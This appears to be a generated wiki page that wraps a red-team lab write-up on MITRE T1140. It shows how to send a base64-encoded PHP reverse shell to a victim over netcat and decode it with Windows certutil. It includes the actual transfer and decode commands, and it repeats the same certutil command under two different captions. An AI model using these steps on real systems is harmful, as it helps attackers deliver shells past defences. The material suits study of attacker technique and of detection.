---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Encode/Decode Data with Certutil

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-defense-evasion-t1140-encode-decode-data-with-certutil` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/defense-evasion/t1140-encode-decode-data-with-certutil.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

In this lab I will transfer a base64 encoded php reverse shell from my attacking machine to the victim machine via netcat and decode the data on the victim system using a native windows binary certutil.

## Preserved Body

````markdown
In this lab I will transfer a base64 encoded php reverse shell from my attacking machine to the victim machine via netcat and decode the data on the victim system using a native windows binary `certutil`.

## Execution

Preview of the content to be encoded on the attacking system:

![](<../../_assets/certutil-shellphp.png>)

Sending the above shell as a base64 encoded string to the victim system \(victim is listening and waiting for the file with `nc -l 4444 > enc`\):
```csharp
base64 < shell.php.gif | nc 10.0.0.2 4444
```
Once the file is received on the victim, let's check its contents:
```csharp
certutil.exe -decode .\enc dec
```
![](<../../_assets/certutil-encoded.png>)

Let's decode the data:
```csharp
certutil.exe -decode .\enc dec
```
Let's have a look at the contents of the file `dec` which now contains the base64 decoded shell:

![](<../../_assets/certutil-decoded.png>)

## References
````

## Source Verification

[source record](../../sources/redteamingtactics/encode-decode-data-with-certutil.md)

## Evidence Excerpt

```text
_asset_filenames:
- certutil-decoded.png
- certutil-encoded.png
- certutil-shellphp.png
_body: '---
description: Defense Evasion
---
# Encode/Decode Data with Certutil
```
